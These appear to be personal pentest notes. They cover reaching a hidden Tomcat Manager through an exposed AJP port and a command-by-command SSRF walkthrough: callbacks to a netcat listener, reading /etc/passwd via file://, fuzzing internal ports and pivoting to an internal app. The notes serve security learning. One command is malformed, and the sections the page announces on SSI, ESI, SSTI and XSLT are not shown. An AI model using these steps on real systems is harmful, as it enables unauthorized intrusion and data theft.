---
title: Notes | Server Side Attacks
author: Zeropio
date: 2022-07-31
categories: [Notes, Vulnerabilities]
tags: [ssrf, ssi, esi, ssti]
permalink: /notes/vulnerabilities/server-side-attacks
---

Server-Side attacks target the application or service provided by a server, whereas the purpose of a client-side attack is to attack the client. These are the types of serve side attacks:
- **Abusing Intermediary Applications**
- **Server-Side Request Forgery** (**SSRF**)
- **Server-Side Includes Injection** (**SSI**)
- **Edge-Side Includes Injection** (**ESI**)
- **Server-Side Template Injection** (**SSTI**)
- **Extensible Stylesheet Language Transformations Server-Side Injection** (**XSLT**)

---

# Abusing Intermediary Applications 

According to Apache, **AJP** (or **JK**) is a wire protocol. It is an optimized version of the HTTP protocol to allow a standalone web server such as Apache to talk to Tomcat. Historically, Apache has been much faster than Tomcat at serving static content. When we come across an open AJP proxy port (**8009 TCP**), we can use Nginx with the `ajp_module` to access the *hidden* Tomcat Manager. This can be done by compiling the Nginx source code and adding the required module, as follows:
- Download the Nginx source code
- Download the required module
- Compile Nginx source code with the `ajp_module`.
- Create a configuration file pointing to the AJP Port

To download the code and compile it:
```console
zero@pio$ wget https://nginx.org/download/nginx-1.21.3.tar.gz 
zero@pio$ tar -xzvf nginx-1.21.3.tar.gz
zero@pio$ git clone https://github.com/dvershinin/nginx_ajp_module.git; cd nginx-1.21.3 
zero@pio$ sudo apt install libpcre3-dev
zero@pio$ ./configure --add-module=`pwd`/../nginx_ajp_module --prefix=/etc/nginx --sbin-path=/usr/sbin/nginx --modules-path=/usr/lib/nginx/modules 
zero@pio$ make
zero@pio$ sudo make install
zero@pio$ nginx -V
```

In `/etc/nginx/conf/nginx.conf`{: .filepath} comment out the entire server block and append the following lines:
```
    upstream tomcats {
        server <SERVER>:<PORT>;
        keepalive 10;
        }
    server {
        listen 80;
        location / {
                ajp_keep_conn on;
                ajp_pass tomcats;
        }
     }
```

> Port 80 can be taken by other service. Change as you wish.
{: .prompt-info}

Start Nginx and check if everything is working correctly by issuing a cURL request to your local host:
```console
zero@pio$ sudo nginx
zero@pio$ curl http://127.0.0.1:80
```

Apache has the AJP module precompiled for us. We will need to install it, though, as it doesn't come in default installations. Configuring the AJP-Proxy in our Apache server can be done as follows:
- Install the libapache2-mod-jk package
- Enable the module
- Create the configuration file pointing to the target AJP-Proxy port

This will be the process:
```console
zero@pio$ sudo apt install libapache2-mod-jk 
zero@pio$ sudo a2enmod proxy_ajp; sudo a2enmod proxy_http 
zero@pio$ export TARGET="<TARGET_IP>" 
zero@pio$ echo -n """<Proxy *>
Order allow,deny
Allow from all
</Proxy>
ProxyPass / ajp://$TARGET:8009/
ProxyPassReverse / ajp://$TARGET:8009/""" | sudo tee /etc/apache2/sites-available/ajp-proxy.conf 
zero@pio$ sudo ln -s /etc/apache2/sites-available/ajp-proxy.conf /etc/apache2/sites-enabled/ajp-proxy.conf 
zero@pio$ sudo systemctl start apache2
```

Now we can access the Tomcat Manager with a cURL or even in the browser accessing the localhost. 

--- 

# Server-Side Request Forgery 

Server-Side Request Forgery (**SSRF**) attacks allow us to abuse server functionality to perform internal or external resource requests on behalf of the server. Exploiting SSRF vulnerabilities can lead to:
- Interacting with known internal systems
- Discovering internal services via port scans
- Disclosing local/sensitive data
- Including files in the target application
- Leaking NetNTLM hashes using UNC Paths (Windows)
- Achieving remote code execution

We can usually find SSRF vulnerabilities in applications that fetch remote resources. When hunting for SSRF vulnerabilities, we should look for: 
- Parts of HTTP requests, including URLs
- File imports such as HTML, PDFs, images, etc.
- Remote server connections to fetch data
- API specification imports
- Dashboards including ping and similar functionalities to check server statuses

## Example

This will be the work flow of a SSRF attack. First the enumeration with Nmap:
```console
zero@pio$ nmap -sT -T5 --min-rate=10000 -p- <TARGET> 
...
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
...
```

Let's cURL the header:
```console
zero@pio$ curl -i -s http://<TARGET>
...
<p>You should be redirected automatically to target URL: <a href="/load?q=index.html">/load?q=index.html</a>. If not click the link. 
...
```

We see a redirection in the parameter `q`. Let's follow it:
```console
zero@pio$ -i -s -L http://<TARGET>
```

The spawned target is an application on the internal network, inaccessible from our current position. The next step is to confirm if the `q` parameter is vulnerable to SSRF. In one terminal, let's use Netcat to listen on port 8080. Now, let us issue a request to the target web application with `http://<OUR IP>` instead of `index.html`{: .filepath} in another terminal, as follows:
```console
zero@pio$ curl -i -s -L http://<TARGET>/load?q=http://<OUR IP>:8080
```

If we see this on our Netcat, there is SSRF:
```console
zero@pio$ nc -lvnp 8080
listening on [any] 8080 ...
connect to [<OUR IP>] from (UNKNOWN) [<TARGET>] 43174
GET / HTTP/1.1
Accept-Encoding: identity
Host: <OUR IP>:8080
User-Agent: Python-urllib/3.8
Connection: close
```

We see that there is a **Python urllib**. This library supports **file**, **http** and **ftp** schemas. Start creating a `index.html`{: .filepath}:
```html
<html>
</body>
<a>SSRF</a>
<body>
<html>
```

Start a HTTP server:
```console
zero@pio$ python3 -m http.server 9000
```

Start a FTP server:
```console
zero@pio$ sudo pip3 install twisted; sudo python3 -m twisted ftp -p 21 -r .
```

Now test the three of them:
```console
zero@pio$ curl -i -s "http://<TARGET IP>/load?q=ftp://<OUR IP>/index.html"

HTTP/1.0 200 OK

zero@pio$ curl -i -s "http://<TARGET IP>/load?q=http://<OUR IP>:9000/index.html"

HTTP/1.0 200 OK

zero@pio$ curl -i -s "http://<TARGET IP>/load?q=file:///etc/passwd" 

HTTP/1.0 200 OK
```

> Fetching remote HTML files can lead to Reflected XSS.
{: .prompt-tip}

Remember, we only have two open ports on the target server. However, there is a possibility of internal applications existing and listening only on localhost. We can use a tool such as ffuf to enumerate these web applications:
```console
zero@pio$ for port in {1..65535};do echo $port >> ports.txt;done 
zero@pio$ ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://127.0.0.1:PORT" -fs <NUMBER>
```

If we receive a valid response for some port test it:
```console
zero@pio$ curl -i -s "http://<TARGET IP>/load?q=http://127.0.0.1:5000" 

HTTP/1.0 200 OK
```

Let's try aiming for a internal web application, like `internal.app.local`:
```console
zero@pio$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=index.html"

HTTP/1.0 200 OK
```

Let's try accessing it:
```console
zero@pio$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http://127.0.0.1:1"

HTTP/1.0 200 OK 
...
<html><body><h1>Resource: http127.0.0.1:1</h1><a>unknown url type: http127.0.0.1</a></body></html>
```

It doesn't understant our request now. This can be because It is filtering the `://`.






































